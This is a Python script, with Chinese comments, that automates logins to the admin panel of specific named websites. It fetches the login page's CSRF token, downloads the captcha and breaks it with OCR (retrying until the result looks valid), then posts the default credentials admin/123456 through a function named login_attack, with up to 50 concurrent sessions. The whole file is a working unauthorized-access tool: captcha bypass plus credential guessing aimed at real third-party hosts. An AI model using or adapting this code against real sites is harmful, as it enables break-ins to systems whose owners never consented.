import asyncio
import aiohttp
import time
import json
import common
import requests
import re, os, uuid, datetime, stat
from bs4 import BeautifulSoup

base_captcha = "captcha"

# base_url = "http://www.ximimim.top:1008"
base_url = "http://www.bmavi.top"
# base_url = "https://facai362.top"
route_login = "/admin/common/login.shtml"
route_captcha = "/captcha.shtml"

urls = [
    f"https://www.cnblogs.com/#p{page}"
    for page in range(1, 2)
]
session_request = requests.Session()
session_request.headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'
}

# 信号量控制并发数量
semaphore = asyncio.Semaphore(50)


async def get_captcha_code(session: aiohttp.ClientSession):  # 获取到正确验证码
    # 创建目录
    dir_path = common.cur_create_dir()
    # 生成图片名称
    uuid = common.create_uuid_png_name()
    # 获取验证码并识别
    captcha_code = await get_captcha_image(base_url + route_captcha, dir_path + "/" + uuid, session)
    return captcha_code


async def get_captcha_image(url, img_path_name, session: aiohttp.ClientSession):  # 获取验证码图片并且识别转为可输入的数字或者字母
    # 获取图片
    zh_model = re.compile(u'[\u4e00-\u9fa5]')  # u4e00 和 u9fa5 是中文的两个端点
    # 异步写入
    async with session.get(url) as resp:
        with open(img_path_name, 'wb') as file:
            while True:
                chunk = await resp.content.read(1024)
                if not chunk:
                    break
                file.write(chunk)
        res = common.img_ocr(img_path_name)
        # # 判断字符串是否仅由数字字符或者字母数字组成
        if res and ((res.isdigit() or res.isalnum()) and not zh_model.search(res)):
            return res
        else:
            print("get_captcha_image方法识别有误,尝试从新中... ", res)
            return await get_captcha_image(url, img_path_name, session)


async def login_token(session: aiohttp.ClientSession):
    async with session.get(base_url + route_login) as resp:
        result = await resp.text()
        soup = BeautifulSoup(result, 'html.parser')
        # # 获取 __token__ 的值
        token = soup.find('input', {'name': '__token__'}).get('value')
        return token


async def login_attack(session: aiohttp.ClientSession, login: common.LoginInfo):  # ip.addr == 104.233.197.195 and http
    # 请求参数
    param = "name={0}&password={1}&captcha={2}&__token__={3}".format(login.username,
                                                                     login.password, login.captcha, login.token)

    print("请求参数", param)
    header = {
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        # 'Cookie': 'PHPSESSID=gq0npeainecd9vn5si0vqb08g0'
    }
    #  + secrets.token_hex(13),
    # data = urllib3.urlencode(postData)
    # res = session.post(url=base_url + route_login, data=data, headers=header, verify=False)
    async with session.post(url=base_url + route_login, data=param, headers=header) as resp:
        text = await resp.text()
        result = json.loads(text)
        # print("login response success", result)
        return result


# 协程函数
async def async_craw(url):
    async with semaphore:
        async with aiohttp.ClientSession() as session:
            print('获取数据中...........')
            # 获取登录地址中的token
            token = await login_token(session)
            print(token)
            captcha = await get_captcha_code(session)
            print("captcha_code=", captcha)
            # 构造信息
            login_info = common.LoginInfo()
            login_info.set_name("admin")
            login_info.set_password("123456")
            login_info.set_token(token)
            login_info.set_captcha(captcha)
            res = await login_attack(session, login_info)
            print("login_attack=", res)


def start_task():
    start = time.time()

    loop = asyncio.get_event_loop()

    tasks = [loop.create_task(async_craw(url)) for url in urls]  # task任务

    loop.run_until_complete(asyncio.wait(tasks))  # 等待所有的任务完成

    end = time.time()
    print("协程 async cost:", end - start, "seconds")


if __name__ == "__main__":
    start_task()
